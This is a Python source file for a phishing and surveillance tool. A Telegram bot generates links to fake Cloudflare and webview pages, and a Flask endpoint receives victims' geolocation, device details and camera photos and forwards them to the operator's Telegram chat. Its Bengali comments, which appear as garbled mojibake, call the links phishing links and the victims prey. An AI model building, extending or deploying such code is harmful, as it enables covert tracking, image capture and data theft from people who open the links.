import os
import json
import logging
from threading import Thread
import telegram
from telegram.ext import Updater, CommandHandler, MessageHandler
from telegram import Filters
from flask import Flask, request, render_template, jsonify

# ‡¶≤‡¶ó‡¶ø‡¶Ç ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶®
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶è‡¶¨‡¶Ç ‡¶´‡¶ø‡¶∂‡¶ø‡¶Ç ‡¶≤‡¶ú‡¶ø‡¶ï‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶™‡ßç‡¶∞‡¶Ø‡¶º‡ßã‡¶ú‡¶®‡ßÄ‡¶Ø‡¶º ‡¶≠‡ßá‡¶∞‡¶ø‡¶Ø‡¶º‡ßá‡¶¨‡¶≤
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TARGET_CHAT_ID = os.environ.get("TARGET_CHAT_ID")
PORT = int(os.environ.get('PORT', 5000))

# ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶¶‡ßá‡¶∞ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ
def load_allowed_users():
    try:
        with open('user.json', 'r') as f:
            data = json.load(f)
            return set(data.get("allowed_users", []))
    except FileNotFoundError:
        logger.error("user.json ‡¶´‡¶æ‡¶á‡¶≤‡¶ü‡¶ø ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø‡•§")
        return set()

ALLOWED_USERS = load_allowed_users()

# ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ‡¶Ø‡¶æ‡¶ö‡¶æ‡¶á ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶°‡ßá‡¶ï‡ßã‡¶∞‡ßá‡¶ü‡¶∞
def restricted(func):
    def wrapped(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ALLOWED_USERS:
            logger.warning(f"‡¶Ö‡¶®‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡ßç‡¶∏‡ßá‡¶∏: {user_id}")
            update.message.reply_text("‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶è‡¶á ‡¶¨‡¶ü ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶®‡ßá‡¶á‡•§")
            return
        return func(update, context, *args, **kwargs)
    return wrapped

# Flask ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶á‡¶®‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶∏ ‡¶§‡ßà‡¶∞‡¶ø
app = Flask(__name__)

# ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶≤‡¶ú‡¶ø‡¶ï
@restricted
def start(update, context):
    update.message.reply_text('‡¶®‡¶Æ‡¶∏‡ßç‡¶ï‡¶æ‡¶∞! /create ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶´‡¶ø‡¶∂‡¶ø‡¶Ç ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®‡•§')

@restricted
def create_command(update, context):
    context.user_data['waiting_for_link'] = True
    update.message.reply_text('‡¶è‡¶ï‡¶ü‡¶ø ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶¶‡¶ø‡¶® ‡¶Ø‡¶æ ‡¶Ü‡¶™‡¶®‡¶ø ‡¶´‡¶ø‡¶∂‡¶ø‡¶Ç ‡¶™‡ßá‡¶ú‡ßá ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶ö‡¶æ‡¶®‡•§')

@restricted
def handle_message(update, context):
    user_id = update.effective_user.id
    if context.user_data.get('waiting_for_link'):
        original_url = update.message.text
        if original_url.startswith('http'):
            base_url = "https://" + os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            cloudflare_link = f"{base_url}/cloudflare?target={original_url}&chat_id={user_id}"
            webview_link = f"{base_url}/webview?target={original_url}&chat_id={user_id}"

            message = (
                f"‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶´‡¶ø‡¶∂‡¶ø‡¶Ç ‡¶≤‡¶ø‡¶Ç‡¶ï‡¶ó‡ßÅ‡¶≤‡ßã ‡¶®‡¶ø‡¶ö‡ßá ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡¶π‡¶≤‡ßã:\n\n"
                f"üîó **Cloudflare Link:**\n`{cloudflare_link}`\n\n"
                f"üîó **Webview Link:**\n`{webview_link}`"
            )
            update.message.reply_text(message, parse_mode='Markdown')
            del context.user_data['waiting_for_link']
        else:
            update.message.reply_text('‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶è‡¶ü‡¶ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡ßà‡¶ß ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶®‡ßü‡•§ ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§')

# Flask ‡¶ì‡¶Ø‡¶º‡ßá‡¶¨ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶≤‡¶ú‡¶ø‡¶ï
@app.route('/cloudflare')
def serve_cloudflare_page():
    original_url = request.args.get('target', 'about:blank')
    chat_id = request.args.get('chat_id')
    return render_template('cloudflare.ejs', original_url=original_url, chat_id=chat_id)

@app.route('/webview')
def serve_webview_page():
    original_url = request.args.get('target', 'about:blank')
    chat_id = request.args.get('chat_id')
    return render_template('webview.ejs', original_url=original_url, chat_id=chat_id)

@app.route('/api/data', methods=['POST'])
def receive_data():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        if not chat_id or int(chat_id) not in ALLOWED_USERS:
            logger.warning(f"‡¶Ö‡¶®‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶°‡ßá‡¶ü‡¶æ ‡¶∞‡¶ø‡¶ï‡ßã‡¶Ø‡¶º‡ßá‡¶∏‡ßç‡¶ü: {chat_id}")
            return jsonify({"status": "error", "message": "Unauthorized"}), 403

        bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
        
        # ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶®‡ßá‡¶∞ ‡¶°‡ßá‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        location_data = data.get('location', {})
        if location_data:
            bot.send_location(chat_id=int(chat_id),
                              latitude=location_data.get('latitude'),
                              longitude=location_data.get('longitude'))
        
        # ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá‡¶∞ ‡¶Ö‡¶®‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶Ø ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        device_info = data.get('device_info', {})
        info_message = f"**‡¶®‡¶§‡ßÅ‡¶® ‡¶∂‡¶ø‡¶ï‡¶æ‡¶∞ ‡¶ß‡¶∞‡¶æ ‡¶™‡ßú‡ßá‡¶õ‡ßá!**\n\n"
        for key, value in device_info.items():
            info_message += f"**{key.capitalize()}:** `{value}`\n"
            
        bot.send_message(chat_id=int(chat_id), text=info_message, parse_mode='Markdown')

        # ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ‡¶∞ ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        image_data = data.get('image', None)
        if image_data:
            import base64
            from io import BytesIO
            image_bytes = base64.b64decode(image_data)
            bot.send_photo(chat_id=int(chat_id), photo=BytesIO(image_bytes))

        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"‡¶°‡ßá‡¶ü‡¶æ ‡¶∞‡¶ø‡¶∏‡¶ø‡¶≠ ‡¶ï‡¶∞‡¶§‡ßá ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ: {e}")
        return jsonify({"status": "error", "message": "Internal Server Error"}), 500

# ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶è‡¶¨‡¶Ç Flask ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶è‡¶ï ‡¶∏‡¶æ‡¶•‡ßá ‡¶ö‡¶æ‡¶≤‡¶æ‡¶®‡ßã
def run_telegram_bot():
    updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("create", create_command))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    updater.start_polling()
    updater.idle()

def run_flask_app():
    app.run(host='0.0.0.0', port=PORT)

if __name__ == '__main__':
    thread_bot = Thread(target=run_telegram_bot)
    thread_flask = Thread(target=run_flask_app)
    thread_bot.start()
    thread_flask.start()
